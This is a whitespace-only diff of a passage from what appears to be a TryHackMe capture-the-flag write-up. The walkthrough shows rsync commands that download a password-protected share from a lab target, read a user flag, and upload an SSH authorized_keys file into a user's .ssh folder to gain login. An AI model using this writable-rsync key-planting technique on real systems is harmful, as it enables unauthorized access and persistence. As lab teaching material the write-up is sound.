@@ -224,10 +224,10 @@ files           Necessary home interaction
 So, we have files share, let's download that to our attacker machine.
 
 ```bash
-kali@kali:mkdir rsync                                                                                                                       
+kali@kali:mkdir rsync
 
 kali@kali:rsync -av rsync://rsync-connect@10.48.171.5/files ./rsync
-Password: 
+Password:
 receiving incremental file list
 ./
 ssm-user/
@@ -255,18 +255,18 @@ sys-internal/user.txt
 So, we find user.txt inside sys-internal. Let's read our third flag.
 
 ```bash
-kali@kali:cat user.txt                                                                                                                      
+kali@kali:cat user.txt
 THM{da.....ab}
 ```
 
 Rsync not only allows to download, but also allows to upload. So, we can basically upload ssh public key to login via ssh. First, let's generate a ssh key.
 
 ```bash
-kali@kali:ssh-keygen -t rsa                                                                                                                 
+kali@kali:ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/id_rsa
-Enter passphrase for "/home/kali/id_rsa" (empty for no passphrase): 
-Enter same passphrase again: 
+Enter passphrase for "/home/kali/id_rsa" (empty for no passphrase):
+Enter same passphrase again:
 Your identification has been saved in /home/kali/id_rsa
 Your public key has been saved in /home/kali/id_rsa.pub
 The key fingerprint is:
@@ -294,8 +294,8 @@ kali@kali:echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHlC6MxSoJDGkvqwvQHG87MWmM
 Since, there was no authorized_keys file in .ssh folder of sys-internal, we can just upload the authorized_keys
 
 ```bash
-kali@kali:rsync -av authorized_keys rsync://rsync-connect@10.48.171.5/files/sys-internal/.ssh/authorized_keys                               
-Password: 
+kali@kali:rsync -av authorized_keys rsync://rsync-connect@10.48.171.5/files/sys-internal/.ssh/authorized_keys
+Password:
 sending incremental file list
 authorized_keys
 
